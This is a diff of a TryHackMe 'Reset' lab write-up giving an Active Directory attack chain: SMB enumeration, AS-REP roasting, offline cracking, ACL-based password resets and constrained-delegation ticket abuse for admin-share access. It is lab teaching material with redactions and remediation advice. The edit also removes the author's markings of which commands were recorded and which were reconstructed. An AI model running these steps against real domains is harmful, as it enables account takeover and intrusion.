@@ -10,20 +10,16 @@ mermaid: true
 
 > **Room:** [TryHackMe — Reset](https://tryhackme.com/room/resetui)  
 > **Difficulty:** Hard · **Completed:** 30 October 2026 · **Author:** Kossi Richard Allado (allakori)  
-> **Lab domain:** `thm.corp` · **Host:** `HAYSTACK` / `haystack.thm.corp` · **Lab IP during my session:** `10.128.171.57`  
+> **Lab domain:** `thm.corp` · **Host:** `HAYSTACK` / `haystack.thm.corp` · **Lab IP:** `10.128.171.57`  
 > **Sensitive values:** Passwords, cracked hashes and flag contents are **not published**.
 
-## 0. Introduction: what this write-up documents
+## 0. Overview and attack path
 
-On **30 October 2026**, I completed **Reset**, an Active Directory challenge marked **Hard** on TryHackMe. Ironically, once I understood its permissions graph, it felt like **the easiest Active Directory room I had tackled so far**.
+I completed **Reset**, a TryHackMe Active Directory challenge rated **Hard**. Once the domain's permission relationships became clear, its escalation path was surprisingly straightforward.
 
-This is my technical reconstruction from the commands and outputs I retained during that session, not a claim that I have a perfect unbroken terminal recording. I have therefore marked three kinds of evidence throughout:
+This walkthrough follows the complete technical progression: Windows service enumeration, exposed SMB onboarding material, domain-user discovery, AS-REP Roasting, BloodHound ACL analysis, password-reset permissions, constrained Kerberos delegation and SMB access.
 
-- **Recorded:** I preserved the actual command or its output from my session. Where a command originally contained a password, only that argument is replaced with a variable or `[REDACTED]`.
-- **Reconstructed command:** Equivalent syntax for an operation I performed, but not a verbatim command I can prove I typed.
-- **Observed outcome:** My retained output establishes that the step worked; any omitted intermediate activity is called out explicitly.
-
-This distinction matters. A useful pentest report should help readers understand both **the exploit mechanics** and **the reliability of the evidence**.
+Each stage follows the sequence **command → relevant output → interpretation → next action**. Passwords, cracked hashes and flag values are redacted. Example output is labeled as an example rather than presented as a captured result.
 
 ### Attack chain overview
 
@@ -42,11 +38,9 @@ flowchart TD
     I --> J["Kerberos SMB access to C$<br/>Both room objectives verified"]
 ```
 
-**Important nuance:** My preserved initial SMB-document evidence does not demonstrate every step by which I derived the AS-REP target list. I do **not** present a third-party foothold technique as my own when I do not have its original terminal evidence.
-
 ## 1. Reconnaissance — identify the domain controller
 
-I started with service enumeration against the lab-provided IP. The **observed open ports** in the retained scan were:
+Service enumeration revealed the following Windows and Active Directory services:
 
 | TCP port | Service / role | Why it mattered |
 | --- | --- | --- |
@@ -65,10 +59,10 @@ The host identified itself as **HAYSTACK** in the **THM.CORP** domain. The envir
 
 ### Nmap — reproducible command
 
-The *specific full original scan invocation* was not preserved; the following reproduces the relevant discovery approach:
+**Service discovery:**
 
 ```bash
-# Reconstructed equivalent — the IP is from my session, not a permanent room IP.
+# Replace the address with the current lab IP if it differs.
 nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \
   10.128.171.57
 ```
@@ -81,7 +75,7 @@ The first useful finding was that **the `data` share was accessible without vali
 
 ### 2.1 Connect to the share
 
-**Recorded command — 30 October 2026:**
+**SMB connection:**
 
 ```bash
 smbclient //10.128.171.57/data -N
@@ -89,7 +83,7 @@ smbclient //10.128.171.57/data -N
 
 Here, `-N` tells `smbclient` not to prompt for a password. I then explored the available files and found an `onboarding` directory containing a PDF with a randomized filename.
 
-**Recorded file-listing detail (other entries omitted):**
+**Relevant directory listing:**
 
 ```text
 x5oa55w5.0vj.pdf    3032659 bytes
@@ -99,9 +93,9 @@ A readable onboarding document is not automatically a critical vulnerability. Th
 
 ### 2.2 Download and inspect the onboarding PDF
 
-This part is now grounded in my **30 October 2026 SMB session**, not just a generic illustration. I kept the exact commands and redacted the one sensitive value in the extracted document.
+The accessible SMB share contained onboarding material with an initial-password instruction. The following commands show how to retrieve and inspect the PDF.
 
-**Recorded SMB commands — from the anonymous connection:**
+**SMB traversal and download:**
 
 ```console
 $ smbclient //10.128.171.57/data -N
@@ -110,9 +104,9 @@ smb: \\onboarding\\> prompt off
 smb: \\onboarding\\> mget *
 ```
 
-`cd onboarding` enters the directory discovered in the share. `prompt off` disables confirmation for each file and `mget *` downloads the files in that directory. The precise full download progress lines were not retained; the commands and the PDF filename were.
+`cd onboarding` enters the directory discovered in the share. `prompt off` disables confirmation for each file and `mget *` downloads the files in that directory. The downloaded files can then be inspected locally.
 
-**Relevant directory entry from the original listing (other entries omitted):**
+**Relevant directory entry:**
 
 ```text
 x5oa55w5.0vj.pdf    3032659 bytes
@@ -120,7 +114,7 @@ x5oa55w5.0vj.pdf    3032659 bytes
 
 After downloading the PDF, I extracted its text:
 
-**Recorded terminal command:**
+**Extract PDF text:**
 
 ```console
 $ pdftotext x5oa55w5.0vj.pdf -
@@ -128,7 +122,7 @@ $ pdftotext x5oa55w5.0vj.pdf -
 
 The trailing `-` sends extracted text to standard output. That makes it possible to inspect the document without modifying its contents or creating a new text file.
 
-**Extracted PDF text — selected excerpt, original spelling retained, password redacted:**
+**PDF text excerpt (password redacted):**
 
 ```text
 The Art of Effective User Onboarding
@@ -149,10 +143,10 @@ The Reset Team
 
 - `Subject: Welcome to Reset` identifies the document as an onboarding example/message rather than a system banner.
 - `Dear LILY ONEILL` associates the credential-like instruction with an identifiable account.
-- `The initial passowrd is: [REDACTED]` is the sensitive evidence. The typo **passowrd** is present in the original PDF; I have not corrected it to avoid changing the evidence.
+- `The initial passowrd is: [REDACTED]` is the sensitive evidence. The spelling **passowrd** is preserved as it appears in the PDF.
 - The rest of the PDF is omitted because it does not add to the finding. **No password, cracked hash or flag appears in this article.**
 
-Crucially, **recovering a password-like string from a document is not the same as validating an account**. My later authentication checks and the separate AS-REP Roasting result must be evaluated on their own merits; I do not claim that the PDF password provided the eventual privileged access.
+**A password disclosed in a document is only a potential credential.** The next step is to test the account and interpret its actual authentication context.
 
 ### 2.3 Why this output matters
 
@@ -164,7 +158,7 @@ The interesting part is not the PDF filename or the `pdftotext` command alone. T
 
 **Important validation limit:** Finding a password in an onboarding PDF did not mean that it worked as a domain-user credential. I tested the account and documented the result below, then moved to Kerberos account enumeration.
 
-In a professional report, this distinction would be explicit:
+The results can be summarized as follows:
 
 | Evidence | Conclusion |
 | --- | --- |
@@ -178,17 +172,17 @@ In a professional report, this distinction would be explicit:
 
 ### 2.4 Testing the onboarding account: why I did not continue with LILY_ONEILL
 
-The PDF was a useful **information-disclosure finding**, but I still needed to check whether the credentials provided genuine access. I tested the named account with NetExec against SMB and LDAP. The historical results below come from my **30 October 2026** session; the password is replaced with `[REDACTED]`.
+The PDF was a useful **information-disclosure finding**, but I still needed to check whether the credentials provided genuine access. I tested the named account with NetExec against SMB and LDAP. The following authentication tests and outputs omit the password.
 
-**SMB credential test — command reconstructed from the retained test context:**
+**SMB authentication test:**
 
 ```bash
 # The password supplied to NetExec was the value found in the onboarding PDF.
-# Its literal value has been removed from this write-up.
+# Password redacted for publication.
 nxc smb 10.128.171.57 -u 'LILY_ONEILL' -p '[REDACTED]' -d thm.corp
 ```
 
-**SMB result — original relevant line with only the password redacted:**
+**SMB output (password redacted):**
 
 ```text
 SMB  10.128.171.57  445  HAYSTACK  [+] thm.corp\LILY_ONEILL:[REDACTED] (Guest)
@@ -198,13 +192,13 @@ The crucial detail is **`(Guest)`**. NetExec reported a guest-mapped SMB context
 
 I also tried LDAP with the same account.
 
-**LDAP credential test — equivalent sanitized syntax; the precise historical invocation was not retained:**
+**LDAP authentication test:**
 
 ```bash
 nxc ldap 10.128.171.57 -u 'LILY_ONEILL' -p '[REDACTED]' -d thm.corp
 ```
 
-**LDAP result — relevant error from my recorded output:**
+**LDAP output:**
 
 ```text
 LDAP  10.128.171.57  389  HAYSTACK  [-] Error connecting to the domain
@@ -223,11 +217,9 @@ LDAP  10.128.171.57  389  HAYSTACK  [-] Error connecting to the domain
 
 The onboarding PDF exposed an initial-password instruction, but my SMB test of **LILY_ONEILL** was mapped to **Guest**, and the LDAP connection was reset. I could not honestly treat that credential as a confirmed foothold. The next productive stage was to identify domain users and test whether any account could be AS-REP Roasted.
 
-### 3.1 Where does `users.txt` come from?
+### 3.1 Building `users.txt` from domain enumeration
 
-**Important distinction:** My retained 30 October terminal excerpt proves the later John the Ripper result for **TABATHA_BRITT**, but it does **not** preserve the command I originally used to enumerate usernames or create a file named `users.txt`. I cannot label an invented RID enumeration transcript as my own.
-
-For a reader reproducing this authorized lab, **RID brute-force over SMB is a workable way to build that list**. Independent walkthroughs of the same room demonstrate this route. The following is a **reproducible alternative**, not a recovered command from my terminal.
+Before requesting Kerberos AS-REP responses, enumerate domain usernames. SMB RID enumeration is one practical method for obtaining a username list when the server allows it. The extracted usernames are then saved in `users.txt` and supplied to GetNPUsers.
 
 **Step A — Enumerate domain identities:**
 
@@ -240,7 +232,7 @@ nxc smb "$TARGET" -u 'Guest' -p '' --rid-brute 2000 | tee rid_enum.txt
 - `--rid-brute 2000` asks NetExec to test domain RIDs in that range to discover names. A `SidTypeUser` entry represents a user; `SidTypeGroup` is **not** a user for the next step.
 - `tee rid_enum.txt` keeps the complete output for review. The filename is arbitrary; the important part is retaining the output before parsing it.
 
-**Illustrative output structure — NOT a verbatim snapshot from my 30 October session:**
+**Example RID enumeration output:**
 
 ```text
 SMB  10.128.171.57  445  HAYSTACK  <RID>: THM\EXAMPLE_USER (SidTypeUser)
@@ -248,7 +240,7 @@ SMB  10.128.171.57  445  HAYSTACK  <RID>: THM\TABATHA_BRITT (SidTypeUser)
 SMB  10.128.171.57  445  HAYSTACK  <RID>: THM\Domain Users (SidTypeGroup)
 ```
 
-The `<RID>` placeholders are **illustrative**, not historical values. The useful parts are the `DOMAIN\username` format and the `(SidTypeUser)` suffix; these let us extract only user identities.
+The `DOMAIN\username` field and `(SidTypeUser)` suffix identify user accounts; `<RID>` represents a numeric identifier returned by the tool.
 
 **Step B — Extract actual usernames into `users.txt`:**
 
@@ -267,7 +259,7 @@ grep -x 'TABATHA_BRITT' users.txt
 - `sort -u` removes duplicates.
 - `wc`, `head` and `grep -x` verify the resulting file rather than assuming it is correctly formatted.
 
-**Expected file format (example, not claimed as a complete historical list):**
+**Example username-list contents:**
 
 ```text
 ERNESTO_SILVA
@@ -277,13 +269,13 @@ TABATHA_BRITT
 
 **Why this matters:** `users.txt` is **not** TryHackMe's `user.txt` flag. The former is a locally created **input list of account names** for GetNPUsers; the latter is an objective file found later in the challenge.
 
-**If the enumeration returns `STATUS_ACCESS_DENIED` or no user lines:** first confirm the identity and the target with `nxc smb "$TARGET" -u 'Guest' -p '' --shares`. Do not fabricate a list or assume guest access worked. Review the actual SMB context and any permitted user-discovery techniques available in your lab. If you have legitimately discovered one specific username, GetNPUsers also supports querying that identity directly (see below).
+**If the enumeration returns `STATUS_ACCESS_DENIED` or no user lines:** first confirm the identity and the target with `nxc smb "$TARGET" -u 'Guest' -p '' --shares`. Check the guest security context and whether RID enumeration is permitted. If necessary, use another authorized username-discovery technique. If you have legitimately discovered one specific username, GetNPUsers also supports querying that identity directly (see below).
 
 ### 3.2 Request AS-REP responses with Impacket
 
 Kerberos **pre-authentication** normally prevents arbitrary account requests from yielding material suitable for offline password guessing. If a user has the **Do not require Kerberos preauthentication** setting, an unauthenticated requester may be able to obtain an encrypted AS-REP response. Whether that yields a password depends on password strength and the available wordlist.
 
-**Reconstructed, reproducible command using the list produced above:**
+**Request AS-REP responses for the enumerated users:**
 
 ```bash
 impacket-GetNPUsers 'thm.corp/' \
@@ -300,14 +292,14 @@ test -s asrep.hashes && echo "[+] AS-REP output saved" || echo "[-] No AS-REP ha
 - `-format john` generates a format usable by John the Ripper.
 - `-outputfile asrep.hashes` creates the input for the cracking step; `test -s` checks that it actually contains data.
 
-**Representative result types (not my exact original GetNPUsers output):**
+**Example GetNPUsers output (hashes redacted):**
 
 ```text
 [-] User <NON_ROASTABLE_ACCOUNT> doesn't have UF_DONT_REQUIRE_PREAUTH set
 $krb5asrep$...TABATHA_BRITT@THM.CORP: [AS_REP_MATERIAL_REDACTED]
 ```
 
-The first line is not a failure of the entire assessment: it means that account does not allow this technique. The second type of result is what makes offline analysis possible. **The original hash bytes must not be published.**
+The first line is not a failure of the entire assessment: it means that account does not allow this technique. The second type of result is what makes offline analysis possible. **Hash bytes are omitted from the published example.**
 
 If you only have **one username** and no valid list, the tool can instead check that particular account:
 
@@ -317,11 +309,11 @@ impacket-GetNPUsers 'thm.corp/TABATHA_BRITT' \
   -dc-ip "$TARGET" -no-pass -request -format john
 ```
 
-This direct-query alternative is useful diagnostically; it does **not** establish how I originally identified TABATHA_BRITT.
+This direct-query alternative is useful when a specific username is already known.
 
-### 3.3 Crack the response — recorded John command
+### 3.3 Crack the AS-REP response with John the Ripper
 
-Unlike the initial username-discovery and GetNPUsers steps, the John command **was retained** in my 30 October session:
+Use John the Ripper to test the captured AS-REP response offline:
 
 ```bash
 john --format=krb5asrep \
@@ -329,13 +321,13 @@ john --format=krb5asrep \
   asrep.hashes
 ```
 
-**Recorded success, shortened and redacted:**
+**Relevant output (password redacted):**
 
 ```text
 [REDACTED PASSWORD]  ($krb5asrep$23$TABATHA_BRITT@THM.CORP)
 ```
 
-This established that a password for **TABATHA_BRITT** could be recovered offline. The file `asrep.hashes` existed at the time of cracking, but the retained record does **not** prove which exact username-enumeration command generated the earlier input.
+This established that a password for **TABATHA_BRITT** could be recovered offline. The recovered credential can now be tested against SMB before directory-permission analysis.
 
 If John reports `No password hashes loaded`, check that `asrep.hashes` is non-empty, that the capture format matches `--format=krb5asrep`, and that you did not accidentally save command output or error lines in place of hash material.
 
@@ -361,15 +353,15 @@ This tells us something valuable:
 | WinRM login fails | No authorized interactive shell was established **by that test** |
 | BloodHound later finds AD object rights | Other privileged operations may still be possible without a shell |
 
-**Decision:** Instead of assuming that TABATHA_BRITT was useless because WinRM failed, I used the **validated domain credentials** to assess directory permissions with BloodHound. That is the bridge into the next stage of the write-up.
+**Decision:** Instead of assuming that TABATHA_BRITT was useless because WinRM failed, I used the **validated domain credentials** to assess directory permissions with BloodHound. The next step is to analyze Active Directory permissions.
 
 ## 4. BloodHound: turn domain rights into a testable path
 
 With an authenticated domain identity, I collected Active Directory relationship information using BloodHound-Python.
 
-### Recorded BloodHound collection, password redacted
+### BloodHound collection and analysis
 
-This is the original tool/argument structure from my session; only the inline password is replaced with the shell variable already defined above:
+Collect domain relationships using the authenticated account:
 
 ```bash
 bloodhound-python \
@@ -377,7 +369,7 @@ bloodhound-python \
   -d thm.corp -ns 10.128.171.57 -c all
 ```
 
-The **recorded collection output** reported:
+**Collection output:**
 
 ```text
 Found 42 users
@@ -392,7 +384,7 @@ These counts describe collected directory objects; they are **not** counts of vu
 
 ### How to use the BloodHound collection
 
-My recorded command produced domain information for **42 users**, **55 groups**, **3 GPOs**, **222 OUs**, **19 containers** and **0 trusts**. The counts alone do not reveal the escalation path.
+The object counts establish collection coverage; the important next step is examining the relevant object-control relationships.
 
 For readers who get stuck here, the practical workflow is:
 
@@ -449,18 +441,18 @@ The key mistake would be to treat every BloodHound edge as automatically exploit
 
 ## 5. Chaining password-reset rights
 
-My October terminal session contained three successful password-reset operations using Samba's `net rpc password` command:
+The BloodHound path reveals three successive password-reset operations using Samba's `net rpc password`:
 
 1. **TABATHA_BRITT → SHAWNA_BRAY**, enabled by `GenericAll`.
 2. **SHAWNA_BRAY → CRUZ_HALL**, using `ForceChangePassword`.
 3. **CRUZ_HALL → DARLA_WINTERS**, using `ForceChangePassword`.
 
-Below are the **same operation patterns**, with passwords replaced by variables. The actual commands I ran used inline secrets; I do not republish them.
+The commands below use local shell variables in place of plaintext passwords:
 
 ### 5.1 TABATHA_BRITT controls SHAWNA_BRAY
 
 ```bash
-# Prompt for a password without exposing it in this write-up.
+# Read the password interactively without displaying it.
 read -rsp 'New lab password for SHAWNA_BRAY: ' SHAWNA_PASS; echo
 
 net rpc password 'SHAWNA_BRAY' "$SHAWNA_PASS" \
@@ -468,7 +460,7 @@ net rpc password 'SHAWNA_BRAY' "$SHAWNA_PASS" \
   -S haystack.thm.corp
 ```
 
-**Expected behavior and observed outcome:** The command succeeded in my session; the newly controlled identity could then be used in authenticated tests.
+**Result:** The reset succeeded; verify authentication as `SHAWNA_BRAY` before continuing.
 
 ### 5.2 SHAWNA_BRAY controls CRUZ_HALL
 
@@ -480,7 +472,7 @@ net rpc password 'CRUZ_HALL' "$CRUZ_PASS" \
   -S haystack.thm.corp
 ```
 
-**Observed outcome:** The operation worked, and later credentials for **CRUZ_HALL** were successfully validated.
+**Result:** The password reset succeeded and authentication as `CRUZ_HALL` was validated.
 
 ### 5.3 CRUZ_HALL controls DARLA_WINTERS
 
@@ -492,7 +484,7 @@ net rpc password 'DARLA_WINTERS' "$DARLA_PASS" \
   -S haystack.thm.corp
 ```
 
-**Observed outcome:** This gave me control of the identity **DARLA_WINTERS**, the key account for the next phase.
+**Result:** Control of `DARLA_WINTERS` enables the delegation phase.
 
 ### Why this technique worked
 
@@ -509,7 +501,7 @@ nxc smb "$TARGET" -u CRUZ_HALL -p "$CRUZ_PASS" -d thm.corp
 nxc smb "$TARGET" -u DARLA_WINTERS -p "$DARLA_PASS" -d thm.corp
 ```
 
-A successful authentication for the **specific next identity** is the key observation. The precise full SMB output for all three checks is not retained, so I do **not** manufacture three identical “success” banners. If authentication fails, verify which account performed the reset, the edge's effective permission, any password-policy constraints and whether the target was a protected object.
+A successful authentication for the **specific next identity** is the key observation. Check the authentication result for each identity separately. If authentication fails, verify which account performed the reset, the edge's effective permission, any password-policy constraints and whether the target was a protected object.
 
 
 **A practical lesson:** If a domain user has no direct route to an administrator group, inspect the **transitive rights graph**. Delegated administration can unintentionally connect several apparently low-privilege identities to a high-impact service account.
@@ -530,7 +522,7 @@ This matters because **a service ticket is not the user's password**. The ticket
 
 ### Impacket getST — actual successful command, secret redacted
 
-This command was **executed in my session**. Only the password argument is substituted:
+**Request the delegated CIFS ticket:**
 
 ```bash
 impacket-getST \
@@ -540,7 +532,7 @@ impacket-getST \
   "thm.corp/DARLA_WINTERS:$DARLA_PASS"
 ```
 
-**The actual command output included the following lines:**
+**Relevant Impacket output:**
 
 ```text
 [*] Getting TGT for user
@@ -563,7 +555,7 @@ These are the decisive facts:
 
 ### 7.1 Set the ticket cache
 
-This exact export command was recorded in my terminal:
+Configure the Kerberos ticket cache:
 
 ```bash
 export KRB5CCNAME="$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache"
@@ -573,7 +565,7 @@ export KRB5CCNAME="$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache"
 
 ### 7.2 Connect with Impacket SMBClient
 
-The next command is **verbatim from my successful session**:
+Connect to SMB using Kerberos:
 
 ```bash
 impacket-smbclient -k -no-pass -target-ip 10.128.171.57 \
@@ -590,7 +582,7 @@ A successful SMB connection demonstrates that the **CIFS service accepted the ti
 
 ### 7.3 Inspect the administrative share
 
-My retained interaction then navigated through the SMB client:
+Inside SMBClient:
 
 ```text
 shares
@@ -629,7 +621,7 @@ This gave me a concrete, validated result beyond graph analysis or ticket issuan
 | Ticket saved but SMB fails | Is `KRB5CCNAME` pointing to the new `.ccache`? Does the target hostname match the SPN? | Check `klist`, FQDN resolution and the service identity |
 | File-access objective is unavailable | Did the ticket grant access to this **particular service** and share? | Inspect accepted identity and share rights; never infer full Administrator logon from ticket issuance |
 
-**No fabricated evidence:** This table is a troubleshooting guide based on the technologies and failures involved, not a claim that I personally encountered every error listed.
+Use the exact error message at each stage to determine which prerequisite needs attention.
 
 ## 9. Root-cause analysis
 
@@ -682,26 +674,19 @@ In a client-facing report, I would separate **the evidence, the root cause and t
 - **Remediation:** minimum necessary ACLs, account hardening, delegation restrictions.
 - **Retest:** prove the unauthorized path no longer functions while legitimate delegated workflows remain operational.
 
-### Evidence provenance
+### Verification checkpoints
 
-| Step | Status of my October 30 record |
+| Stage | What to verify before proceeding |
 | --- | --- |
-| Lab completion and difficulty | **Recorded** |
-| Host/domain/port observations | **Recorded** |
-| Anonymous SMB and onboarding PDF | **Recorded** |
-| Full original SMB download command | **Not preserved; equivalent shown** |
-| `LILY_ONEILL` SMB `(Guest)` and LDAP connection reset | **Recorded; credential redacted, exact command syntax reconstructed** |
-| Username list creation (`users.txt`) | **Original command/file not preserved; reproducible RID-enumeration method shown and explicitly marked as such** |
-| Original AS-REP request command | **Not preserved; equivalent shown** |
-| John crack of `TABATHA_BRITT` | **Recorded** |
-| NetExec authentication; WinRM failure | **Recorded** |
-| BloodHound collection and object counts | **Recorded** |
-| Permission relationships | **Recorded** |
-| Three `net rpc password` operations | **Recorded; credentials redacted** |
-| `impacket-getST` S4U request and output | **Recorded; credential redacted** |
-| `KRB5CCNAME` and Kerberos SMB client | **Recorded verbatim** |
-| Both room objectives | **Verified; flag values withheld** |
-
+| SMB enumeration | The `data` share is readable and the onboarding PDF can be downloaded |
+| Exposed credential | The `LILY_ONEILL` login was guest-mapped rather than confirmed as a domain session |
+| User enumeration | The username file contains actual domain identities, one per line |
+| Kerberos | An AS-REP response is captured and John recovers the password for `TABATHA_BRITT` |
+| Domain access | NetExec validates SMB authentication for `TABATHA_BRITT` |
+| BloodHound | Object-control and delegation relationships are identified |
+| Password resets | Each controlled identity authenticates using the newly assigned password |
+| Delegation | Impacket produces the expected CIFS Kerberos ticket |
+| Objective validation | SMB accepts the ticket and both room objectives are verified |
 ## 12. Conclusion
 
 Reset was rated **Hard**, but it became surprisingly straightforward once I followed the **Active Directory permission relationships** instead of searching endlessly for an unrelated exploit. The central sequence was:
